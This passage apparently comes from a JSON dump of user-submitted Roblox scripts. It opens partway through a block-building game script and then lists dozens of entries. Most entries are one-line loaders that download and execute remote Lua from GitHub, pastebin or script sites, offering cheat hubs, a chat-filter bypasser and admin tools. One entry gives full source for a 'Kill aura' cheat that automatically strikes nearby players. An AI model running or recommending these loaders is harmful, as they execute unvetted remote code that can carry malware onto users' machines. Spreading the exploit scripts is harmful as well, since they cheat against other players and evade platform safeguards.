y, z))\n\t\t\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileU = 2.6\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileV = 2.6\n\t\t\t\t\t\tend\n\t\t\t\t\telseif selectedBlock == 3 then\n\t\t\t\t\t\tlocal blk = placeBlock(toolBar.Diamond_Ore, CFrame.new(x, y, z))\n\t\t\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileU = 2.6\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileV = 2.6\n\t\t\t\t\t\tend\n\t\t\t\t\telseif selectedBlock == 4 then\n\t\t\t\t\t\tlocal blk = placeBlock(toolBar.Diamond_Block, CFrame.new(x, y, z))\n\t\t\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileU = 2.6\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileV = 2.6\n\t\t\t\t\t\tend\n\t\t\t\t\telseif selectedBlock == 5 then\n\t\t\t\t\t\tlocal blk = placeBlock(toolBar.Wood_Planks, CFrame.new(x, y, z))\n\t\t\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileU = 2.6\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileV = 2.6\n\t\t\t\t\t\tend\n\t\t\t\t\telseif selectedBlock == 6 then\n\t\t\t\t\t\tlocal blk = placeBlock(toolBar.Oak_Log, CFrame.new(x, y, z))\n\t\t\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileU = 2.6\n\t\t\t\t\t\t\tblk:WaitForChild(f).StudsPerTileV = 2.6\n\t\t\t\t\t\tend\n\t\t\t\t\telseif selectedBlock == 7 or selectedBlock == 8 then\n\t\t\t\t\t\tif Mouse.Target.Size.X <= 10 and Mouse.Target.Size.Y <= 10 and Mouse.Target.Size.Z <= 10 then\n\t\t\t\t\t\t\tMouse.Target.Parent = nil\n\t\t\t\t\t\tend\n\t\t\t\t\tend\n\t\t\t\tend\n\t\t\tend\n\t\tend)\t\t\n\t\t\n\t\tlocal hasItemOnHand = 0\n\t\tlocal hi = 0\n\t\t-- selection thingy\n\t\tlocal selectLabel = Instance.new(\"TextLabel\", gui)\n\t\tselectLabel.Size = UDim2.new(0, 32, 0, 32)\n\t\tselectLabel.Position = UDim2.new(0.5, -160 + (selectedBlock*40), 1, -105)\n\t\tselectLabel.BackgroundTransparency = 0.5\n\t\tselectLabel.BackgroundColor3 = Color3.new(1, 1, 1)\n\t\tselectLabel.BorderSizePixel = 0\n\t\tselectLabel.Text = \"\"\n\t\tselectLabel.ZIndex = 3\n\t\t--\t\n\t\tMouse.KeyDown:connect(function(key)\n\t\t\tif key == \"q\" then\n\t\t\t\tsneaking = 1\n\t\t\t\thumanoid.WalkSpeed = humanoid.WalkSpeed / 2\n\t\t\t\trootJoint.C1 = CFrame.new(0, 0.325, 0) * CFrame.Angles(math.rad(sneaking*45), 0, 0)\n\t\t\t\tlH.C0 = CFrame.new(0, 0.975, 0) * CFrame.Angles(-math.rad(sneaking*45), 0, 0)\n\t\t\t\trH.C0 = CFrame.new(0, 0.975, 0) * CFrame.Angles(math.rad(sneaking*45), 0, 0)\n\t\t\t\t--print(\"Sneaking...\")\n\t\t\tend\n\t\t\tif key == \"8\" then \n\t\t\t\tselectedBlock = 7\n\t\t\t\titemOnHand = nil\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tif hasItemOnHand == 1 then hi = 1 end\n\t\t\tend\n\t\t\tif key == \"9\" then \n\t\t\t\tselectedBlock = 8\n\t\t\t\titemOnHand = nil\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tif hasItemOnHand == 1 then hi = 1 end\n\t\t\tend\n\t\t\tif key == \"1\" then \n\t\t\t\tselectedBlock = 0\n\t\t\t\titemOnHand = toolBar.Dirt\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tputTexture(handItem, itemOnHand.frontTex, itemOnHand.backTex,\n\t\t\t\t\titemOnHand.topTex, itemOnHand.bottomTex,\n\t\t\t\t\titemOnHand.leftTex, itemOnHand.rightTex, \"Texture\")\n\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileU = 0.52\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileV = 0.52\n\t\t\t\tend\n\t\t\tend\n\t\t\tif key == \"2\" then \n\t\t\t\tselectedBlock = 1 \n\t\t\t\titemOnHand = toolBar.Grass\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tputTexture(handItem, itemOnHand.frontTex, itemOnHand.backTex,\n\t\t\t\t\titemOnHand.topTex, itemOnHand.bottomTex,\n\t\t\t\t\titemOnHand.leftTex, itemOnHand.rightTex, \"Texture\")\n\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileU = 0.52\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileV = 0.52\n\t\t\t\tend\n\t\t\tend\n\t\t\tif key == \"3\" then \n\t\t\t\tselectedBlock = 2 \n\t\t\t\titemOnHand = toolBar.Stone\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tputTexture(handItem, itemOnHand.frontTex, itemOnHand.backTex,\n\t\t\t\t\titemOnHand.topTex, itemOnHand.bottomTex,\n\t\t\t\t\titemOnHand.leftTex, itemOnHand.rightTex, \"Texture\")\n\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileU = 0.52\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileV = 0.52\n\t\t\t\tend\n\t\t\tend\n\t\t\tif key == \"4\" then \n\t\t\t\tselectedBlock = 3 \n\t\t\t\titemOnHand = toolBar.Diamond_Ore\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tputTexture(handItem, itemOnHand.frontTex, itemOnHand.backTex,\n\t\t\t\t\titemOnHand.topTex, itemOnHand.bottomTex,\n\t\t\t\t\titemOnHand.leftTex, itemOnHand.rightTex, \"Texture\")\n\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileU = 0.52\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileV = 0.52\n\t\t\t\tend\n\t\t\tend\n\t\t\tif key == \"5\" then \n\t\t\t\tselectedBlock = 4 \n\t\t\t\titemOnHand = toolBar.Diamond_Block\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tputTexture(handItem, itemOnHand.frontTex, itemOnHand.backTex,\n\t\t\t\t\titemOnHand.topTex, itemOnHand.bottomTex,\n\t\t\t\t\titemOnHand.leftTex, itemOnHand.rightTex, \"Texture\")\n\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileU = 0.52\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileV = 0.52\n\t\t\t\tend\n\t\t\tend\n\t\t\tif key == \"6\" then \n\t\t\t\tselectedBlock = 5 \n\t\t\t\titemOnHand = toolBar.Wood_Planks\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tputTexture(handItem, itemOnHand.frontTex, itemOnHand.backTex,\n\t\t\t\t\titemOnHand.topTex, itemOnHand.bottomTex,\n\t\t\t\t\titemOnHand.leftTex, itemOnHand.rightTex, \"Texture\")\n\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileU = 0.52\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileV = 0.52\n\t\t\t\tend\n\t\t\tend\n\t\t\tif key == \"7\" then \n\t\t\t\tselectedBlock = 6 \n\t\t\t\titemOnHand = toolBar.Oak_Log\n\t\t\t\tfor _,d in pairs(handItem:GetChildren()) do\n\t\t\t\t\td:Destroy()\n\t\t\t\tend\n\t\t\t\tputTexture(handItem, itemOnHand.frontTex, itemOnHand.backTex,\n\t\t\t\t\titemOnHand.topTex, itemOnHand.bottomTex,\n\t\t\t\t\titemOnHand.leftTex, itemOnHand.rightTex, \"Texture\")\n\t\t\t\tfor _,f in pairs(facesToResize) do\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileU = 0.52\n\t\t\t\t\thandItem:WaitForChild(f).StudsPerTileV = 0.52\n\t\t\t\tend\n\t\t\tend\n\t\t\tif (key == \"0\" or key == \"1\" or key == \"2\" \n\t\t\t\tor key == \"3\" or key == \"4\" or key == \"5\"\n\t\t\t\tor key == \"6\" or key == \"7\") and hasItemOnHand == 0 then hi = 1 end\n\t\t\tselectLabel.Position = UDim2.new(0.5, -160 + ((selectedBlock)*40), 1, -105)\n\t\tend)\n\t\t\n\t\tMouse.KeyUp:connect(function(key)\n\t\t\tif key == \"q\" then\n\t\t\t\tsneaking = 0\n\t\t\t\thumanoid.WalkSpeed = humanoid.WalkSpeed * 2\n\t\t\t\trootJoint.C1 = CFrame.new(0, 0.05, 0) * CFrame.Angles(0, 0, 0)\n\t\t\t\tlH.C0 = CFrame.new(0, 0.975, 0) * CFrame.Angles(0, 0, 0)\n\t\t\t\trH.C0 = CFrame.new(0, 0.975, 0) * CFrame.Angles(0, 0, 0)\n\t\t\t\t--print(\"Stopped sneaking...\")\n\t\t\tend\n\t\tend)\n\t\t\n\t\twhile RS:wait() do\n\t\t\tif itemOnHand ~= nil then \n\t\t\t\thasItemOnHand = 1 \n\t\t\t\thandItem.Transparency = 0\n\t\t\telse \n\t\t\t\thasItemOnHand = 0 \n\t\t\t\thandItem.Transparency = 1\n\t\t\tend\n\t\t\tif humanoid.Health < oldHP then\n\t\t\t\tdamageTime = 60\n\t\t\t\tsound:Play()\n\t\t\tend\n\t\t\toldHP = humanoid.Health\n\t\t\tif damageTime > 0 and humanoid.Health > 0 then\n\t\t\t\tfor _,p in pairs(char:GetChildren()) do\n\t\t\t\t\tif p.Name ~= \"HumanoidRootPart\" and p.ClassName == \"Part\" then\n\t\t\t\t\t\tif p.Name == \"DamagePart\" then\n\t\t\t\t\t\t\tp.Transparency = 0.5\n\t\t\t\t\t\tend\n\t\t\t\t\tend\n\t\t\t\tend\n\t\t\t\tdamageTime = damageTime - 2\n\t\t\t\tif damageTime <= 0 then\n\t\t\t\t\tfor _,p in pairs(char:GetChildren()) do\n\t\t\t\t\t\tif p.Name ~= \"HumanoidRootPart\" and p.ClassName == \"Part\" then\n\t\t\t\t\t\t\tif p.Name == \"DamagePart\" then\n\t\t\t\t\t\t\t\tp.Transparency = 1\n\t\t\t\t\t\t\tend\n\t\t\t\t\t\tend\n\t\t\t\t\tend\n\t\t\t\tend\n\t\t\tend\n\t\t\tcamPart.CFrame = camera.CFrame\n\t\t\tneck.C1 = CFrame.new(0, 0.975, 0) * CFrame.fromEulerAnglesXYZ(math.rad(sneaking*45), math.rad(camPart.Orientation.Y - torso.Orientation.Y), 0)\n\t\t\tneck.C0 = CFrame.new(0, -0.65, 0) * CFrame.Angles(-math.rad(camPart.Orientation.X - torso.Orientation.X - (sneaking*45)), 0, 0)\t\t\n\t\t\t\n\t\t\tif getMagnitudeXZ(torso.Velocity) > 1 then\n\t\t\t\tif walkAnim >= 1 then\n\t\t\t\t\tincreaseWalkAnim = -1\n\t\t\t\telseif walkAnim <= -1 then\n\t\t\t\t\tincreaseWalkAnim = 1\n\t\t\t\tend\n\t\t\t\twalkAnim = walkAnim + (increaseWalkAnim/(10+(sneaking*20)))\n\t\t\telse\n\t\t\t\twalkAnim = 0\n\t\t\tend\n\t\t\t\n\t\t\t--lH.C0 = CFrame.new(0, 0.975, 0) * CFrame.Angles(-math.rad(sneaking*45), 0, 0)\n\t\t\t--rH.C0 = CFrame.new(0, 0.975, 0) * CFrame.Angles(math.rad(sneaking*45), 0, 0)\n\t\t\tlH.C0 = lH.C0:lerp(CFrame.new(0, 0.975, 0) * CFrame.Angles(-math.rad(sneaking*45) + math.rad(damageTime*1.5) + math.rad(walkAnim*getMagnitudeXZ(torso.Velocity)*5/(1+sneaking)), 0, 0), 0.1)\n\t    \trH.C0 = rH.C0:lerp(CFrame.new(0, 0.975, 0) * CFrame.Angles(math.rad(sneaking*45) + math.rad(damageTime*1.5) + math.rad(walkAnim*getMagnitudeXZ(torso.Velocity)*5/(1+sneaking)), 0, 0), 0.1)\n\t\t\t--\n\t\t\t--rootJoint.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)\n\t\t\t--print(math.abs(head.Orientation.Y) - math.abs(humRootPart.Orientation.Y))\n\t\t\t--if (head.Orientation.Y * 2) - (head.Orientation.Y + torso.Orientation.Y) > 45 then\n\t\t\t\t--humRootPart.CFrame = humRootPart.CFrame * CFrame.Angles(0, math.rad(-45 + head.Orientation.Y), 0)\n\t\t\t\t--print(\"-45\")\n\t\t\t--end\n\t\t\t--if (head.Orientation.Y * 2) - (head.Orientation.Y + torso.Orientation.Y) < -45 then\n\t\t\t\t--humRootPart.CFrame = humRootPart.CFrame * CFrame.Angles(0, math.rad(45 + head.Orientation.Y), 0)\n\t\t\t\t--print(\"45\")\n\t\t\t--end\n\t\t\t\n\t\t\t--move these arms\n\t\t\trootJoint.C1 = rootJoint.C1:lerp(CFrame.new(0, 0.325, 0) * CFrame.Angles(math.rad(sneaking*45), math.rad(punchRotY), 0), 0.2)\n\t\t\t\n\t    \tlS.C0 = lS.C0:lerp(CFrame.new(-0.325, 0.975, 0) * CFrame.Angles(idleAnimRotX/20 + math.rad(-hasItemOnHand*10) + math.rad(punchRotX) + math.rad(damageTime*1.5) + math.rad(walkAnim*getMagnitudeXZ(torso.Velocity)*5/(1+sneaking)), 0, math.rad(punchRotZ) + idleAnimRotZ/20), 0.025+(math.min(1, getMagnitudeXZ(torso.Velocity))/12) + divide(punchSpeed, 6) + hi)\n\t    \trS.C0 = rS.C0:lerp(CFrame.new(-0.325, 0.975, 0) * CFrame.Angles(idleAnimRotX/20 + math.rad(damageTime*1.5) + math.rad(walkAnim*getMagnitudeXZ(torso.Velocity)*5/(1+sneaking)), 0, idleAnimRotZ/20), 0.025+(math.min(1, getMagnitudeXZ(torso.Velocity))/12))\n\t\t\tif punching == 1 and punchEnded == 1 then\n\t\t\t\tpunching = 0\n\t\t\t\t--print(\"steve uses punch!!\")\n\t\t\t\tlocal coPunch = coroutine.wrap(function()\n\t\t\t\t\tpunchEnded = 0\n\t\t\t\t\tpunchSpeed = 1\n\t\t\t\t\tpunchRotX = -60\n\t\t\t\t\tpunchRotY = -8\n\t\t\t\t\tpunchRotZ = -35\n\t\t\t\t\twait(0.075)\n\t\t\t\t\tpunchSpeed = 1\n\t\t\t\t\tpunchRotX = -75\n\t\t\t\t\tpunchRotY = 8\n\t\t\t\t\tpunchRotZ = 40\n\t\t\t\t\twait(0.075)\n\t\t\t\t\tpunchSpeed = 1\n\t\t\t\t\tpunchRotX = -20\n\t\t\t\t\tpunchRotZ = 40\n\t\t\t\t\twait(0.075)\n\t\t\t\t\tpunchSpeed = 3.5\n\t\t\t\t\tpunchRotX = 0\n\t\t\t\t\tpunchRotY = 0\n\t\t\t\t\tpunchRotZ = 0\n\t\t\t\t\tpunchEnded = 1\n\t\t\t\t\twait(0.06)\t\n\t\t\t\t\tpunchSpeed = 0\t\t\t\n\t\t\t\tend)\n\t\t\t\tcoPunch()\n\t\t\tend\t\t\t\n\t\t\tif ticks > 20 then\n\t\t\t\tticks = 0\n\t\t\t\tif times == 0 then\n\t\t\t\t\ttimes = times + 1\n\t\t\t\t\tidleAnimRotX = -1\n\t\t\t\t\tidleAnimRotZ = 0\n\t\t\t\telseif times == 1 then\n\t\t\t\t\ttimes = times + 1\n\t\t\t\t\tidleAnimRotX = -0.75\n\t\t\t\t\tidleAnimRotZ = -0.75\n\t\t\t\telseif times == 2 then\n\t\t\t\t\ttimes = times + 1\n\t\t\t\t\tidleAnimRotX = 0\n\t\t\t\t\tidleAnimRotZ = -1\n\t\t\t\telseif times == 3 then\n\t\t\t\t\ttimes = times + 1\n\t\t\t\t\tidleAnimRotX = 0.75\n\t\t\t\t\tidleAnimRotZ = -0.75\n\t\t\t\t\t--idleAnimRotX = 0.75\n\t\t\t\t\t--idleAnimRotZ = -0\n\t\t\t\telseif times == 4 then\n\t\t\t\t\ttimes = times + 1\n\t\t\t\t\tidleAnimRotX = 1\n\t\t\t\t\tidleAnimRotZ = 0\n\t\t\t\t\t--idleAnimRotX = 1\n\t\t\t\t\t--idleAnimRotZ = 0\n\t\t\t\telseif times == 5 then\n\t\t\t\t\ttimes = times + 1\n\t\t\t\t\tidleAnimRotX = 0.75\n\t\t\t\t\tidleAnimRotZ = 0.75\n\t\t\t\telseif times == 6 then\n\t\t\t\t\ttimes = times + 1\n\t\t\t\t\tidleAnimRotX = 0\n\t\t\t\t\tidleAnimRotZ = 1\n\t\t\t\telseif times == 7 then\n\t\t\t\t\ttimes = 0\n\t\t\t\t\tidleAnimRotX = -0.75\n\t\t\t\t\tidleAnimRotZ = 0.75\n\t\t\t\tend\n\t\t\tend\n\t\t\tif hi == 1 then hi = 0 end\n\t\t\tticks = ticks + 1\n\t\tend\n\tend\nend",
+      "Script_Title": "minecraft",
+      "User_ID": 4831984091,
+      "Username": "SOYXDD_XD15"
+    },
+    "Script1201": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://bonkhubloader.netlify.app\",true))()",
+      "Script_Title": "Fisch",
+      "User_ID": 3839389759,
+      "Username": "wibuasu1"
+    },
+    "Script1203": {
+      "Date": "November 10 2024",
+      "Description": "freee script",
+      "Script": "loadstring(game:HttpGet((\"https://raw.githubusercontent.com/Trev0rZ/LoaderM/main/ImperialHub-Working.lua\"),true))()",
+      "Script_Title": "brookheaven ",
+      "User_ID": 4607632599,
+      "Username": "zainnnnhh"
+    },
+    "Script1204": {
+      "Date": "November 09 2024",
+      "Description": "dex {op} MB 💻🛠️",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Keyless-mobile-dex-17888\"))()",
+      "Script_Title": "HX DEX MB {OP}",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script1205": {
+      "Date": "November 09 2024",
+      "Description": "best script",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2\"))()",
+      "Script_Title": "murder mystery 2",
+      "User_ID": 3020367742,
+      "Username": "jxstteryck"
+    },
+    "Script1206": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Gazer-Ha/Animated/main/G\"))()",
+      "Script_Title": "Pogi jijer ",
+      "User_ID": 7036763866,
+      "Username": "Johndys2005"
+    },
+    "Script1207": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet((\"https://raw.githubusercontent.com/aadyian9000/the-thing/main/GoldenGummyFlashlight.lua\"),true))()",
+      "Script_Title": "Golden Gummy(doors)",
+      "User_ID": 3599379295,
+      "Username": "heo25pro"
+    },
+    "Script1208": {
+      "Date": "November 09 2024",
+      "Description": "🤫",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Simple-AutoFarm_549\"))()",
+      "Script_Title": "last pirate",
+      "User_ID": 2019746912,
+      "Username": "joaosantosroblox"
+    },
+    "Script1209": {
+      "Date": "November 10 2024",
+      "Description": "best script frfr",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source\"))();",
+      "Script_Title": "Nameless admin v2",
+      "User_ID": 5601261111,
+      "Username": "ferg_12223"
+    },
+    "Script1210": {
+      "Date": "November 10 2024",
+      "Description": "Break in 2 script",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Break-In-2-(Story)-Starry-OP-Script-Hub-160-Features-17869\"))()",
+      "Script_Title": "Starry Hub",
+      "User_ID": 5601261111,
+      "Username": "ferg_12223"
+    },
+    "Script1211": {
+      "Date": "November 10 2024",
+      "Description": "this script is evade game",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ToraScript/Script/main/Evade\"))()",
+      "Script_Title": "evade op game",
+      "User_ID": 1796748209,
+      "Username": "GPanji20"
+    },
+    "Script1212": {
+      "Date": "November 10 2024",
+      "Description": "fortutious hub",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/TrollGuiMaker/f0rtuit0us-hub/refs/heads/main/old\"))()",
+      "Script_Title": "brookhaven ",
+      "User_ID": 7563467519,
+      "Username": "skibiditop149"
+    },
+    "Script1213": {
+      "Date": "November 10 2024",
+      "Description": "Vexon hub OP",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/DiosDi/VexonHub/main/TSB-VexonHub\"))()",
+      "Script_Title": "Tsb vexon",
+      "User_ID": 7563467519,
+      "Username": "skibiditop149"
+    },
+    "Script1214": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "require(4875169740).load(\"YourNameHere\")",
+      "Script_Title": "vereus",
+      "User_ID": 7545152961,
+      "Username": "Gideon_ur"
+    },
+    "Script1215": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://www.soggy-ware.cf\"))()\n",
+      "Script_Title": "uh",
+      "User_ID": 1502045903,
+      "Username": "ayeyahzee6313"
+    },
+    "Script1216": {
+      "Date": "November 10 2024",
+      "Description": "only players",
+      "Script": "local connections = getgenv().configs and getgenv().configs.connection\nif connections then\n    local Disable = configs.Disable\n    for i,v in connections do\n        v:Disconnect() \n    end\n    Disable:Fire()\n    Disable:Destroy()\n    table.clear(configs)\nend\n\nlocal Disable = Instance.new(\"BindableEvent\")\ngetgenv().configs = {\n    connections = {},\n    Disable = Disable,\n    Size = Vector3.new(10,10,10),\n    DeathCheck = true\n}\n\nlocal Players = cloneref(game:GetService(\"Players\"))\nlocal RunService = cloneref(game:GetService(\"RunService\"))\nlocal lp = Players.LocalPlayer\nlocal Run = true\nlocal Ignorelist = OverlapParams.new()\nIgnorelist.FilterType = Enum.RaycastFilterType.Include\n\nlocal function getchar(plr)\n    local plr = plr or lp\n    return plr.Character\nend\n\nlocal function gethumanoid(plr: Player | Character)\n    local char = plr:IsA(\"Model\") and plr or getchar(plr)\n\n    if char then\n        return char:FindFirstChildWhichIsA(\"Humanoid\")\n    end\nend\n\nlocal function IsAlive(Humanoid)\n    return Humanoid and Humanoid.Health > 0\nend\n\nlocal function GetTouchInterest(Tool)\n    return Tool and Tool:FindFirstChildWhichIsA(\"TouchTransmitter\",true)\nend\n\nlocal function GetCharacters(LocalPlayerChar)\n    local Characters = {}\n    for i,v in Players:GetPlayers() do\n        table.insert(Characters,getchar(v))\n    end\n    table.remove(Characters,table.find(Characters,LocalPlayerChar))\n    return Characters\nend\n\nlocal function Attack(Tool,TouchPart,ToTouch)\n    if Tool:IsDescendantOf(workspace) then\n        Tool:Activate()\n        firetouchinterest(TouchPart,ToTouch,1)\n        firetouchinterest(TouchPart,ToTouch,0)\n    end\nend\n\ntable.insert(getgenv().configs.connections,Disable.Event:Connect(function()\n    Run = false\nend))\n\nwhile Run do\n    local char = getchar()\n    if IsAlive(gethumanoid(char)) then\n        local Tool = char and char:FindFirstChildWhichIsA(\"Tool\")\n        local TouchInterest = Tool and GetTouchInterest(Tool)\n\n        if TouchInterest then\n            local TouchPart = TouchInterest.Parent\n            local Characters = GetCharacters(char)\n            Ignorelist.FilterDescendantsInstances = Characters\n            local InstancesInBox = workspace:GetPartBoundsInBox(TouchPart.CFrame,TouchPart.Size + getgenv().configs.Size,Ignorelist)\n\n            for i,v in InstancesInBox do\n                local Character = v:FindFirstAncestorWhichIsA(\"Model\")\n\n                if table.find(Characters,Character) then\n                    if getgenv().configs.DeathCheck then                    \n                        if IsAlive(gethumanoid(Character)) then\n                            Attack(Tool,TouchPart,v)\n                        end\n                    else\n                        Attack(Tool,TouchPart,v)\n                    end\n                end\n            end\n        end\n    end\n    RunService.Heartbeat:Wait()\nend",
+      "Script_Title": "Kill aura ",
+      "User_ID": 1128129763,
+      "Username": "raspbexrie"
+    },
+    "Script1217": {
+      "Date": "November 10 2024",
+      "Description": "Also Emotes",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Ragdoll-Engine-BEST-SCRIPT-WORKING-SystemBroken-7544\"))()",
+      "Script_Title": "Super Man Fly",
+      "User_ID": 3518215722,
+      "Username": "markJohncelestino11"
+    },
+    "Script1218": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/BingusWR/FreakyAnimationScript/refs/heads/main/FreakyRobloxAnimation\"))()",
+      "Script_Title": "hug players",
+      "User_ID": 7443382899,
+      "Username": "xacuerpuwel8"
+    },
+    "Script1219": {
+      "Date": "November 10 2024",
+      "Description": "the chosen one script",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Chosen-One-VPLI-hub-20992\"))()",
+      "Script_Title": "VPLI hub v1",
+      "User_ID": 5601261111,
+      "Username": "ferg_12223"
+    },
+    "Script1220": {
+      "Date": "November 10 2024",
+      "Description": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Ghost",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "loadstring(game:Http",
+      "User_ID": 7184221394,
+      "Username": "fyF239s"
+    },
+    "Script1221": {
+      "Date": "November 10 2024",
+      "Description": "Best",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua\",true))()",
+      "Script_Title": "chat bypasser",
+      "User_ID": 5601261111,
+      "Username": "ferg_12223"
+    },
+    "Script1222": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Salvatore-hub-21920\"))()",
+      "Script_Title": "salvatore",
+      "User_ID": 7546310020,
+      "Username": "elbanana404"
+    },
+    "Script1223": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Croissant-Hub-21940\"))()",
+      "Script_Title": "croissant",
+      "User_ID": 7546310020,
+      "Username": "elbanana404"
+    },
+    "Script1224": {
+      "Date": "November 10 2024",
+      "Description": "cat hub NOT MINE",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-cat-hub-solara-REUPLOAD-21165\"))()",
+      "Script_Title": "Cat hub Notmine",
+      "User_ID": 7382381247,
+      "Username": "stickmanepiky"
+    },
+    "Script1225": {
+      "Date": "November 10 2024",
+      "Description": "Hello",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/a-literal-baseplate.-30-GMES-SUPPORTED-PCRBLX-HUB-21530\"))()",
+      "Script_Title": "A literal baseplate",
+      "User_ID": 7382381247,
+      "Username": "stickmanepiky"
+    },
+    "Script1226": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(juego:HttpGet('https://pastebin.com/raw/8QYUkXih'))()\n",
+      "Script_Title": "mining simulator ",
+      "User_ID": 3829460896,
+      "Username": "DON_KAMARONV"
+    },
+    "Script1227": {
+      "Date": "November 10 2024",
+      "Description": "🥐🥐",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Croissant-Hub-21940\"))()",
+      "Script_Title": "Croissant Hub",
+      "User_ID": 3518215722,
+      "Username": "markJohncelestino11"
+    },
+    "Script1228": {
+      "Date": "November 10 2024",
+      "Description": "only r6",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/UnknowingNSFW/Roblox-Exploit/main/RoClothes.lua'))()",
+      "Script_Title": "sus r6 body🤯",
+      "User_ID": 7200964064,
+      "Username": "BackupForTsbBan"
+    },
+    "Script1229": {
+      "Date": "November 10 2024",
+      "Description": "universal hub",
+      "Script": "loadstring(game:HttpGet('https://pastebin.com/raw/0iwSFSYq'))()",
+      "Script_Title": "Lordihub",
+      "User_ID": 1414396170,
+      "Username": "RocSanic"
+    },
+    "Script1230": {
+      "Date": "November 10 2024",
+      "Description": "blox Fruits best 😈",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/main/AnDepZaiHubBeta.lua\"))()",
+      "Script_Title": "Try this",
+      "User_ID": 156924828,
+      "Username": "Jackeddk"
+    },
+    "Script1231": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv1.3\"))()",
+      "Script_Title": "arsenal script ",
+      "User_ID": 7510389938,
